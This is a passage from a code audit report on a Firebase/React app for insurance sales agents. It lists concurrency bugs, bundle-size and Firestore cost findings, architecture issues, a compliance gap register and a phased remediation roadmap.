- **Recommendation:** wrap both in `runTransaction` (transition) and a single transaction or batch (reconcile); backstop legal transitions in rules (SEC-09).
- **Impact:** correctness ▲▲. Effort M · Change-risk Med · Priority P2.

#### BUG-08 — Leaderboard points: read-modify-write race and resubmit double-count *(old BUG-003 STILL-OPEN, BUG-004 PARTIAL)*
- **Severity:** Medium — points drive the leaderboard and weekly champions, which are shown on the kiosk.
- **Location:** `functions/index.js:1456-1461` (`lbRef.get()` then `prevPoints + points` then write, no transaction); `:1394-1396` only skips submitted→submitted.
- **Scenario:** two submissions for the same agent processed concurrently lose one increment; a manager reverting a report to draft and the agent resubmitting adds the week's points twice.
- **Recommendation:** `FieldValue.increment()` inside a transaction keyed on `submissionId`, storing the last-awarded points per submission so a resubmit applies the delta. Effort S · Change-risk Med (functions deploy) · Priority P2.

#### BUG-09 — Sunday cron TOCTOU can overwrite a just-submitted report *(old BUG-005, STILL-OPEN)*
- **Severity:** Medium — lost agent submission on the busiest night of the week.
- **Location:** `functions/aggregators/sundayDailyToWeekly.js:110-114` (`draftRef.get()` → skip if submitted → later `set`, outside a transaction; Admin SDK bypasses the rules that would otherwise block it).
- **Recommendation:** `runTransaction` with the status check inside, or `create()`/precondition on `updateTime`. Effort S · Change-risk Med · Priority P2.

#### BUG-10 — Sibling dashboard reads fail silently *(old BUG-010, BUG-011, PARTIAL)*
- **Severity:** Low — empty panels look like "no data".
- **Location:** `src/components/dashboard/AgentDashboard.jsx:249-273` (six reads `.catch(() => null/[])`); `src/components/dashboard/ManagerDashboard.jsx:408, 432` (`getTenantUsers(...).catch(() => [])`).
- **Recommendation:** per-panel error state, as already done for submissions (`:255-258`). Effort S · Priority P3.

#### BUG-11 — `useTeamRoster` spins forever when `tenantId` is falsy *(old BUG-013, STILL-OPEN)*
- **Severity:** Low.
- **Location:** `src/hooks/useTeamRoster.js:34` (`loading` starts `true`), `:41-42` (`if (!tenantId) return;` without `setLoading(false)`).
- **Recommendation:** set loading false (or an explicit "no tenant" state) on the early return. Effort S · Priority P4.

#### BUG-12 — `weekStarting` Sunday invariant not enforced in rules *(old BUG-014, STILL-OPEN)*
- **Severity:** Low — the client validates (`validateSundayDate`), and the doc id embeds the date, but a direct SDK write can store a non-Sunday week that aggregators then mis-bucket.
- **Location:** `firestore.rules:316-322` (submissions create/update: no `weekStarting` check, no numeric-type checks).
- **Recommendation:** require `weekStarting` to match `^\d{4}-\d{2}-\d{2}$` and equal the doc-id suffix; the day-of-week check can use `timestamp.date(y,m,d).dayOfWeek()` (rules `timestamp` supports it). Effort S · Change-risk Low · Priority P3.

### 4.4 Performance & speed

**Build report (`npm run build`, 20.77 s, verbatim chunk lines ≥ 100 kB):**

```
dist/assets/index-A8kG8aHr.css                         134.21 kB │ gzip:  23.95 kB
dist/assets/index-DLX8ySQq.js                          111.78 kB │ gzip:  29.05 kB
dist/assets/TenantAdminDashboard-oaP76FFU.js           150.56 kB │ gzip:  38.29 kB
dist/assets/TeamPlannerPanel-Pu0Yf-VA.js               181.68 kB │ gzip:  40.38 kB
dist/assets/AgentDashboard-CzRfLGWi.js                 245.09 kB │ gzip:  60.75 kB
dist/assets/vendor-charts-vc4kssl8.js                  291.93 kB │ gzip:  80.42 kB
dist/assets/vendor-firebase-BBvu9Ecl.js                472.77 kB │ gzip: 141.90 kB
dist/assets/vendor-DIfz0C62.js                         601.25 kB │ gzip: 240.19 kB
dist/assets/FinancingSelfView-DZdQ3WM7.js              627.33 kB │ gzip: 148.08 kB
dist/assets/ManagerDashboard-BfYksHWr.js               635.38 kB │ gzip: 140.19 kB
dist/assets/vendor-pdf-DOnqTDMs.js                   1,127.06 kB │ gzip: 334.76 kB
(!) Some chunks are larger than 700 kB after minification.
```

`vendor-pdf` is loaded on demand (`src/services/exportService.js:31, 69, 100` use dynamic `import('@react-pdf/renderer')`) — acceptable. An agent's first load is roughly `vendor` + `vendor-firebase` + `index` + `AgentDashboard` + `FinancingSelfView` ≈ 620 kB gzip.

#### PERF-01 — `FinancingSelfView` (627 kB / 148 kB gz) is imported eagerly by both dashboards *(old PERF-005, STILL-OPEN)*
- **Severity:** Medium — ~24 % of an agent's first-load JS on 3G/4G in the field, for a view many agents never open.
- **Location:** `src/components/dashboard/AgentDashboard.jsx:71`; `src/components/dashboard/ManagerDashboard.jsx:72`.
- **Recommendation:** `React.lazy(() => import('../financing/FinancingSelfView'))` behind the existing `ChunkLoadErrorBoundary`; check what makes the chunk 627 kB (likely charts or a shared engine pulled in) with `vite-bundle-visualizer`.
- **Impact:** performance ▲▲ (first load), UX ▲; others —. Effort S · Change-risk Low · Priority P2.

#### PERF-02 — Portfolio-import rollback reads history per policy (N+1) *(new)*
- **Severity:** Low — only on undo; a full book is hundreds of policies.
- **Location:** `functions/portfolioImport/rollback.js:151-156` (`countOrphanedHistory`: one `.get()` per deleted doc).
- **Recommendation:** `Promise.all` in bounded batches, or a `collectionGroup('history').where('importRunId','==',…)` query. Effort S · Change-risk Low · Priority P4.

#### PERF-03 — `managerActivityStandardOverrides` read whole-collection *(new)*
- **Severity:** Low (small collection today).
- **Location:** `src/services/managerStandardOverrideService.js:103`.
- **Recommendation:** filter by `managerId`/branch; add `limit`. Effort S · Priority P4.

#### PERF-04 — ManagerDashboard fetches tenant users up to three times *(old PERF-001, PARTIAL)*
- **Severity:** Low. **Location:** `src/components/dashboard/ManagerDashboard.jsx:212, 408, 432`.
- **Recommendation:** one cached query (React Query is already in the recon docs, `docs/audits/react-query-adoption-recon-2026-07-07.md`). Effort S · Priority P3.

#### PERF-05 — Per-agent read fan-outs *(old PERF-002 PARTIAL, PERF-003 STILL-OPEN)*
- **Severity:** Low (bounded by roster size; ~one read per agent per view).
- **Location:** `src/services/persistencyService.js:145-152` (parallel `getDoc` per agent); `src/components/manager/CompliancePanel.jsx:235-236` (`getWeeklyPlan` per roster uid).
- **Recommendation:** one `where('weekStart','==',…)` query scoped by branch/unit instead of N gets. Effort M · Priority P3.

#### PERF-06 — Leaderboard listener is unbounded *(old PERF-004, STILL-OPEN)*
- **Severity:** Low. **Location:** `src/components/gamification/Leaderboard.jsx:82-97` (`orderBy('points','desc')`, no `limit`, live listener).
- **Recommendation:** `limit(50)` and a separate "my rank" read. Effort S · Priority P3.

#### PERF-07 — Client-side aggregations and long lists *(old PERF-006, A5:PERF-009/011, A4:PERF-003; Info)*
- `CareerPortal` recomputes YTD/quarterly/2-year aggregates from all submissions in a `useMemo`; GamePlan hub runs 7 effects with several sequential reads (`src/components/dashboard/GamePlanV2/index.jsx`); MasterSheet renders without virtualization. Acceptable at pilot scale; revisit when a branch passes ~100 agents.

### 4.5 Cost

#### COST-01 — Hourly leaderboard recompute rescans all submissions and users *(old COST-001, STILL-OPEN)*
- **Severity:** Medium at scale, Low today — reads grow as (submissions + users) × 24 per day per tenant, whether anything changed or not.
- **Location:** `functions/leaderboard/leaderboardAggregate.js:438-440` (`schedule('0 * * * *')`), header comment `:8-19` ("deliberately do NOT use an onWrite trigger").
- **Estimate (directional):** a 60-agent branch with ~40 weeks of YTD submissions ≈ 2,400 + 60 reads/run ≈ 59k reads/day ≈ 1.8 M/month for one branch, before any user opens the app.
- **Recommendation:** skip the run when no submission changed since the last run (store a `lastRecomputedAt` and query `updatedAt > it` with `limit(1)`), or recompute only the affected branch from `onSubmissionWrite`.
- **Impact:** cost ▲▲ at scale; correctness —. Effort M · Change-risk Med · Priority P3.

Other cost vectors are carried under their security IDs: **SEC-11** (no App Check → unmetered abuse by any holder of a login), **SEC-07** (any agent can list the whole `persistency` collection), **PERF-06** (unbounded live leaderboard listener re-bills on every change), **PRIV-05** (`mail/` and `notifications/` grow forever).

### 4.6 Architecture & maintainability

#### ARCH-01 — Firestore writes outside `src/services/` *(new)*
- **Severity:** Low.
- **Location:** `src/components/onboarding/WelcomeScreen.jsx:47` (`updateDoc` on user doc); `src/context/AuthContext.jsx:113` (lazy email sync `updateDoc`); `src/lib/kiosk/kioskConfigService.js:35` (`setDoc` — a service living under `lib/`).
- **Recommendation:** move into `userService` / `kioskService`. Effort S · Change-risk Low · Priority P4.

#### ARCH-02 — Dead code and twins *(new; Info)*
- `src/components/campaigns/CampaignCard.jsx` has no production import (only test mocks and a comment in `CampaignHeroCard.jsx:28,35` saying it was replaced). Delete in a housekeeping PR.
- `functions/kiosk/validateToken.js:5-19` re-implements `validateTokenData` from `src/lib/kiosk/utils.js` with no parity test (the OIPA import has one: `src/lib/portfolioImport/__tests__/functionsMirror.test.js`). Add a mirror test like it.

#### ARCH-03 — 430 inline `style={{}}` sites against the "NO inline styles" rule *(A4:ARCH-002, STILL-OPEN)*
- **Severity:** Low — many are dynamic widths/colours that Tailwind cannot express; the count is a ceiling, not a defect count.
- **Location:** `git grep -n "style={{" -- src` excluding tests and the exempt `AgentReportDocument.jsx`.
- **Recommendation:** allow dynamic-value inline styles explicitly in CLAUDE.md and lint the rest. Effort M · Priority P4.

#### ARCH-04 — Scheduled functions and `onUserCreated` hardcode one tenant *(A4:ARCH-001, STILL-OPEN)*
- **Severity:** Medium — a hard blocker for P10; also a correctness trap (a user created in another tenant is logged under `tatillife_south`).
- **Location:** `functions/index.js:74` (`TENANT_ID = 'tatillife_south'`), used at `:125, :135, :169, :180, :505`.
- **Recommendation:** iterate tenants from a `tenants` index in each cron; derive the tenant in `onUserCreated` from the created user's claims or skip. Effort M · Change-risk Med · Priority P3.

#### ARCH-05 — Daily→weekly aggregator twin has no parity test *(old ARCH-001, STILL-OPEN)*
- **Severity:** Low. **Location:** `functions/__tests__/dailyToWeekly.test.js` and `src/lib/schema/__tests__/dailyPatch.test.js` test each side separately.
- **Recommendation:** a mirror test like `src/lib/portfolioImport/__tests__/functionsMirror.test.js`. Effort S · Priority P3.

---

## 5. Compliance gap register

Status: **P** present · **Pa** partial · **A** absent.

| Standard / control | Requirement | Status | Closing IDs |
|---|---|---|---|
| GDPR Art. 5(1)(c) / ISO A.5.34 | Data minimisation | Pa — OIPA import brings whole books; no column minimisation review | PRIV-02 |
| GDPR Art. 5(1)(e) / ISO A.5.33, A.8.10 | Storage limitation, deletion | A | PRIV-01, PRIV-05 |
| GDPR Art. 6, 13/14 / T&T DPA principles | Lawful basis, notice | A | PRIV-02 |
| GDPR Art. 15, 20 | Access, portability | A (role-gated exports only) | PRIV-03, PRIV-08 |
| GDPR Art. 17 | Erasure | A | PRIV-01 |
| GDPR Art. 25 / ISO A.8.3 | Privacy by design, least privilege | Pa — tenant isolation good; branch isolation weak | SEC-02, SEC-05, SEC-07, SEC-08 |
| GDPR Art. 28 / ISO A.5.19–A.5.22 | Processor contracts and register | A (not in repo; NEEDS-VERIFICATION) | PRIV-06 |
| GDPR Art. 30 / ISO A.8.15 | Records of processing, logging | Pa — admin-action audit logs exist; no read/export logs | PRIV-03 |
| GDPR Art. 32 / ISO A.8.24 | Security of processing, encryption | Pa — provider encryption; client cache not cleared | SEC-10, PRIV-09 |
| GDPR Art. 33/34 / ISO A.5.24–A.5.26 | Breach detection and notice within 72 h | A | PRIV-04 |
| GDPR Ch. V / T&T DPA transfer provision | Cross-border transfer | Pa — US hosting, undocumented | PRIV-06 |
| ISO A.5.15, A.5.18 / SOC 2 CC6.1–CC6.3 | Access control, privileged access | Pa | SEC-01, SEC-02, SEC-03, PRIV-07 |
| ISO A.5.17 / ASVS V2.10 | Authentication secrets | Pa | SEC-19, SEC-22 |
| ISO A.8.8 / OWASP A06 | Technical vulnerability management | Pa — root clean; `functions/` 1 critical + 5 high; no CI audit gate | SEC-16 |
| ISO A.8.9 / A.8.32 | Configuration and change management | Pa — Storage rules outside git; `main` protection admin-bypassable | SEC-12, SEC-21 |
| ISO A.8.16 / SOC 2 CC7.2 | Monitoring | A | PRIV-04, SEC-11 |
| ISO A.8.25–A.8.29 / SOC 2 CC8.1 | Secure development and security testing | Pa — rules tests exist but never run in CI | SEC-21 |
| ISO A.8.26 / ASVS V14.4 | Application security requirements (headers) | A | SEC-13 |
| OWASP A03 / ASVS V5.3 | Output encoding (email, CSV) | A | SEC-14, SEC-15 |
| SOC 2 PI1.2–PI1.3 | Processing integrity (money) | Pa — strong ledger logic; non-atomic financing, declared-vs-evidenced blending | SEC-09, BUG-01, BUG-07, BUG-08, BUG-09 |
| SOC 2 A1.2 | Availability / recovery | Pa — no corrupt-cache recovery on client | SEC-10 |

---

## 6. Quick wins (high impact / low effort)

1. **Delete `setUserClaims`** (SEC-01) — no caller; closes the only Critical.
2. **`kioskTokens` → CF-write-only; missing `expiresAt` = invalid** (SEC-03).
3. **Scope the `persistency` list rule** (SEC-07) — one rule edit plus a matching `where()` in the client.
4. **Clear the IndexedDB cache on logout + a "Repair app data" boundary** (SEC-10) — ~30 lines.
5. **Security headers in `vercel.json`** (SEC-13), CSP report-only first.
6. **Escape HTML in `renderTemplate`; neutralize CSV formulas** (SEC-14, SEC-15) — two small pure functions with tests.
7. **Lazy-load `FinancingSelfView`** (PERF-01).
8. **Pin `storage.rules` into the repo** (SEC-12).

## 7. Phased remediation roadmap

| Phase | When | Items |
|---|---|---|
| 0 — Guard rails | Before any other fix | SEC-21 (rules tests in CI, required check) so every fix below lands with a failing-then-passing test |
| 1 — Pre-pilot blockers | Before Tatil demo / pilot | SEC-01, SEC-03, SEC-07, SEC-10, SEC-13, SEC-14, SEC-15, SEC-12, PERF-01 |
| 2 — During pilot | Pilot weeks 1–6 | SEC-05, SEC-06, SEC-08 (with `branchId` backfill), SEC-09, SEC-11 (monitor → enforce), SEC-16, SEC-04, BUG-01, BUG-02, BUG-04, BUG-07, BUG-08, BUG-09, PRIV-01, PRIV-02 (DPA with Tatil), PRIV-04 (alerts + breach runbook), PRIV-06 (document residency + processors), PRIV-07 |
| 3 — Before multi-tenant (P10) | Post-pilot | SEC-02, SEC-22, SEC-19, BUG-03, BUG-05, BUG-06, BUG-10, BUG-12, PRIV-03, PRIV-05, PRIV-08, COST-01, ARCH-04, ARCH-05, PERF-04/05/06 |
| 4 — Backlog | Opportunistic | SEC-17, SEC-18, SEC-20, BUG-11, PERF-02/03/07, ARCH-01/02/03, PRIV-09 |

## 8. Audit coverage, limits and self-critique

- **Not verified at runtime:** live Storage rules (SEC-12), live Firestore location/region (PRIV residency), Clarity dashboard masking settings, which service accounts hold which IAM roles, whether any user other than Kyron holds `tenant_admin` (bounds SEC-01/SEC-02 likelihood), and reachability of the vulnerable `functions/` dependencies.
- **Christmas campaign C1–C4:** no file names it (`git grep -i christmas|xmas` → only generic campaign code: `CampaignLensPanel.jsx`, `CampaignHeroCard.jsx`, `awardsEngine.js` cash suppression). Reviewed via those generic paths only; campaign-specific rule values in config were not audited line by line.
- **Depth:** `functions/index.js` (1,400+ lines), `firestore.rules` (2,322 lines) and the OIPA import CFs were read at the authorization-decision points, not every line. Weakest area: rules blocks from `coachingNotes` (`:1117`) to `financingEscalations` (`:2213`) were scanned for helper use, not reasoned through per role; the v3 planner/nudge blocks may hold further cross-scope gaps.
- **Old-finding statuses** for PRIV/BUG/PERF/COST/ARCH were established from a read-only evidence sweep plus spot checks; a status of FIXED means the cited mechanism is gone, not that the behaviour was exercised.
- **Falsification (Rule 23):** SEC-07 is overturned if Firestore rejects `getDocs(collection(db,'tenants/T/persistency'))` from an agent session in the emulator — run that before banking it. SEC-03 is overturned if the kiosk admin UI already fails for UMs *and* the rules are not what is in `firestore.rules` on the deployed project (`firebase firestore:rules:get` equivalent in Console).
